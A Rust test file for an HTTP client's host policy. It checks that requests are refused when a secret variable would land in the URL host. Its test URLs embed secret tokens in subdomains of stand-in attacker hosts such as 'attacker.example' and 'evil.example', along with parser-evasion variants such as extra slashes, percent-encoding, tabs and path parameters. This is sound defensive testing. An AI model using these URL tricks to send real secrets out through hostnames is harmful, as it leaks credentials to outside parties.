//! Under a host policy a sensitive value in the host refuses the send before any lookup,
//! naming the host as the template wrote it.

use crate::common;

use apinata_core::{
    Collection, ContextOptions, ExecError, ExecOptions, Executor, MemoryStore, SecretStore,
    VarContext,
};
use common::{at, write_tree};
use std::sync::{Arc, Mutex};
use wiremock::matchers::path;
use wiremock::{Mock, MockServer, ResponseTemplate};

const ROOT: &str = "opencollection: \"1.0.0\"\ninfo:\n  name: t\n";
const DEV: &str = "name: dev\nvariables:\n  - name: token\n    secret: true\n  - name: base\n    value: \"https://{{token}}.attacker.example\"\n  - name: scheme\n    value: \"https://\"\n";

/// Resolves a GET of `url` with header `X-A: {{token}}` in `dev`, `token` being `secret`.
fn resolved(url: &str, secret: &str, process: &[(&str, &str)]) -> apinata_core::ResolvedRequest {
    resolved_with(url, "", secret, process)
}

/// Like `resolved`, with `extra` YAML appended under `http` (indented two spaces).
fn resolved_with(
    url: &str,
    extra: &str,
    secret: &str,
    process: &[(&str, &str)],
) -> apinata_core::ResolvedRequest {
    let req = format!(
        "info:\n  name: r\n  type: http\nhttp:\n  method: GET\n  url: \"{url}\"\n  headers:\n    - name: X-A\n      value: \"{{{{token}}}}\"\n{extra}"
    );
    let dir = write_tree(&[
        ("opencollection.yml", ROOT),
        ("environments/dev.yml", DEV),
        ("r.yml", &req),
    ]);
    let c = Collection::open(dir.path()).expect("opens");
    let store = MemoryStore::new();
    store.set(&c.secret_key("dev", "token"), secret).unwrap();
    let options = ContextOptions::new()
        .env("dev")
        .secrets(Arc::new(store))
        .process_env(process.iter().copied());
    let ctx = VarContext::new(&c, options).expect("context");
    at(&c, &ctx, "r.yml").expect("resolves")
}

/// An executor whose policy trusts nothing and records each host it is asked about.
fn guarded() -> (Executor, Arc<Mutex<Vec<String>>>) {
    let asked = Arc::new(Mutex::new(Vec::new()));
    let log = Arc::clone(&asked);
    let policy = move |host: &str| {
        log.lock().unwrap().push(host.to_owned());
        false
    };
    (
        Executor::new(ExecOptions::new().host_policy(Arc::new(policy))).unwrap(),
        asked,
    )
}

fn secret_in_host(err: &ExecError) -> Option<&str> {
    match err {
        ExecError::SecretInHost { host, .. } => Some(host),
        _ => None,
    }
}

#[tokio::test]
async fn a_secret_in_the_host_is_refused_with_the_template_host() {
    let (exec, asked) = guarded();
    let cases = [
        (
            "https://{{token}}.attacker.example/x",
            "{{token}}.attacker.example",
        ),
        ("{{base}}/x", "{{base}}"),
        (
            "https://user:pw@{{token}}.attacker.example:8443/",
            "{{token}}.attacker.example",
        ),
    ];
    for (url, template) in cases {
        let err = exec
            .send(&resolved(url, "AbC123xyz", &[]))
            .await
            .unwrap_err();
        assert_eq!(secret_in_host(&err), Some(template), "{url}: {err:?}");
        assert!(!err.to_string().contains("AbC123xyz"), "{err}");
    }
    assert!(
        asked.lock().unwrap().is_empty(),
        "refused before the policy is asked"
    );
}

#[tokio::test]
async fn the_comparison_ignores_case() {
    // The header substitutes the secret; the host spells it in another case without a variable.
    let (exec, _) = guarded();
    let err = exec
        .send(&resolved(
            "https://ABC123XYZ.evil.example/",
            "AbC123xyz",
            &[],
        ))
        .await
        .unwrap_err();
    assert_eq!(
        secret_in_host(&err),
        Some("ABC123XYZ.evil.example"),
        "{err:?}"
    );
}

#[tokio::test]
async fn secrets_in_userinfo_path_query_and_port_are_not_in_the_host() {
    let server = MockServer::start().await;
    Mock::given(path("/ok"))
        .respond_with(ResponseTemplate::new(200))
        .mount(&server)
        .await;
    let port = server.address().port().to_string();
    let (exec, _) = guarded();
    let url = "http://me:{{token}}@127.0.0.1:{{process.env.PORT}}/ok?k={{token}}#{{token}}";
    let res = exec
        .send(&resolved(url, "AbC123xyz", &[("PORT", port.as_str())]))
        .await
        .expect("sent");
    assert_eq!(res.status(), 200);
}

#[tokio::test]
async fn without_a_policy_a_secret_host_is_sent_as_before() {
    let server = MockServer::start().await;
    Mock::given(path("/ok"))
        .respond_with(ResponseTemplate::new(200))
        .mount(&server)
        .await;
    let url = format!("http://{{{{token}}}}:{}/ok", server.address().port());
    let req = resolved(&url, "127.0.0.1", &[]);
    let (guarded, _) = guarded();
    let err = guarded.send(&req).await.unwrap_err();
    assert_eq!(secret_in_host(&err), Some("{{token}}"), "{err:?}");
    let plain = Executor::new(ExecOptions::new()).unwrap();
    assert_eq!(plain.send(&req).await.expect("sent").status(), 200);
}

/// Asserts `req` is refused as a secret in the host naming `template`, and that the policy
/// never saw a host carrying `fragment` of the secret.
async fn assert_refused(req: &apinata_core::ResolvedRequest, template: &str, fragment: &str) {
    let (exec, asked) = guarded();
    let err = exec.send(req).await.unwrap_err();
    assert_eq!(secret_in_host(&err), Some(template), "{err:?}");
    let asked = asked.lock().unwrap();
    assert!(
        !asked
            .iter()
            .any(|host| host.to_lowercase().contains(fragment)),
        "policy saw the secret: {asked:?}"
    );
}

#[tokio::test]
async fn extra_slashes_after_a_special_scheme_do_not_hide_the_host() {
    for (url, template) in [
        (
            "https:///{{token}}.evil.example/x",
            "{{token}}.evil.example",
        ),
        (
            "HTTPS:////{{token}}.evil.example/x",
            "{{token}}.evil.example",
        ),
        (
            "https://\\\\{{token}}.evil.example/x",
            "{{token}}.evil.example",
        ),
        ("{{scheme}}/{{token}}.evil.example/x", "{{scheme}}"),
    ] {
        let req = resolved(url, "abc123xyz", &[]);
        assert_refused(&req, template, "abc123xyz").await;
    }
}

#[tokio::test]
async fn a_path_param_that_lands_in_the_host_is_refused() {
    let params =
        "  params:\n    - name: p\n      value: \"{{token}}.evil.example\"\n      type: path\n";
    let req = resolved_with("https:///:p", params, "abc123xyz", &[]);
    assert_refused(&req, ":p", "abc123xyz").await;
}

#[tokio::test]
async fn a_secret_cut_by_a_delimiter_still_counts() {
    // Only part of each secret reaches the host; the rest falls in the path or userinfo.
    let req = resolved("https://{{token}}/x", "abcsecret/def", &[]);
    assert_refused(&req, "{{token}}", "abcsecret").await;
    let req = resolved("https://{{token}}.evil.example/", "ab@cdsecret", &[]);
    assert_refused(&req, "{{token}}.evil.example", "cdsecret").await;
}

#[tokio::test]
async fn a_secret_the_parser_decodes_or_rejoins_into_the_host_is_refused() {
    // The parser percent-decodes the host and strips tabs, so neither hides the secret.
    let req = resolved("https://%61bc123xyz.evil.example/", "abc123xyz", &[]);
    assert_refused(&req, "%61bc123xyz.evil.example", "abc123xyz").await;
    let req = resolved("https://abc\\t123xyz.evil.example/", "abc123xyz", &[]);
    assert_refused(&req, "abc\t123xyz.evil.example", "abc123xyz").await;
}
